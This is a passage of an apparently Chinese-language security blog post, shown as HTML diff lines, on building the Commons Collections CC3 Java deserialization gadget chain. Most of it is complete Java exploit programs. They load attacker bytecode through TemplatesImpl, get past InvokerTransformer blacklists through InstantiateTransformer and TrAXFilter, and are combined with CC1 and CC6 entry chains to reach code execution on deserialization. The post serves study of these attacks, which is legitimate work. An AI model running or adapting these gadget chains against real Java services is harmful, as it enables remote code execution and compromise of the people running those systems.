class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(templates);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; HashMap1 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        HashMap1.put(TiedMapget,<span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line">        LazydecorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryField.set(LazydecorateMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(HashMap1);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>同理不再描述，流程都差不多。</p>
+<h3 id="yso-de-lian-zi" id="yso的链子">yso的链子</h3>
+<p>以上说的都是：黑名单会过滤runtime，所以我们可以使用templatesImpl类加载。<br>
+接下来说的是：黑名单会过滤invokerTransformer.transform的解决方案。</p>
+<p>所以我们找谁调用了TemplatesImpl 类的 newTransformer() 方法。<br>
+说一下这几个方法。<br>
+1、Process main里面，是作为一般对象使用的，所以不选择它。<br>
+2、getOutProperties，是反射调用的方法，可能会在fastjson漏洞里被调用。<br>
+3、TransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参。</p>
+<p><img src="/imgss/java150.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * javax.xml.transform.sax.TransformerFactory implementation.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformerFactoryImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>所以最终选择TrAXFilter。</p>
+<p><img src="/imgss/java151.png" alt=""></p>
+<p>没有继承serializable，不可序列化，构造函数传参为templates。(这里不可序列化的话，可以跟runtime一样：class是可以序列化的(cc1中使用的ConstantTransformer加载runtime.class)，然后通过反射将其变成可以序列化的形式。)</p>
+<p>所以我们只要执行这个类的构造函数即可命令执行。</p>
+<p>作者使用一个新的类 InstantiateTransformer，用来绕过invokerTransformer的限制。</p>
+<p>我们去找 InstantiateTransformer 类下的 transform 方法。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(</span><br><span class="line">            <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">    &#125;</span><br><span class="line">    Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure></div>
+<p>该类继承了Serializable。</p>
+<p>transform方法，判断传入的参数class类为空，则抛出异常。<br>
+class不为空的话，获取指定参数的构造器 赋值给con，利用newInstance调用构造函数。</p>
+<p><img src="/imgss/java152.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br></pre></td></tr></table></figure></div>
+<p>两个参数，第一个class数组，第二个object数组</p>
+<p>伪代码构造：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>调用InstantiateTransformer transform方法。传入transform对象。<br>
+伪代码：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure></div>
+<p>后半部分的代码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure></div>
+<h4 id="cc-1-lian-zuo-wei-qian-ban-bu-fen" id="CC1-链作为前半部分">CC1 链作为前半部分</h4>
+<p><img src="/imgss/java153.png" alt=""></p>
+<p>这段 EXP 在序列化的时候是没问题的，在反序列化的时候报错了，报错说我们传入 instantiateTransformer 是一个字符串而不是一个类。<br>
+cc1的老毛病，setValue() 的传参无法控制，需要引入 Transformer 与 ChainedTransformer 加以辅助。</p>
+<p>解决后的exp：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        chainedTransformer.transform(templates);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; AnnotationdeclaredConstructor = annotClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationdeclaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) AnnotationdeclaredConstructor.newInstance(Override.class, LazydecorateMap);</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        Object o = AnnotationdeclaredConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java154.png" alt=""></p>
+<h4 id="cc-6-lian-zuo-wei-qian-ban-bu-fen" id="CC6-链作为前半部分">CC6 链作为前半部分</h4>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3Test_cc6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; HashMap1 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        HashMap1.put(TiedMapget,<span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line">        LazydecorateMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryField.set(LazydecorateMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(HashMap1);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    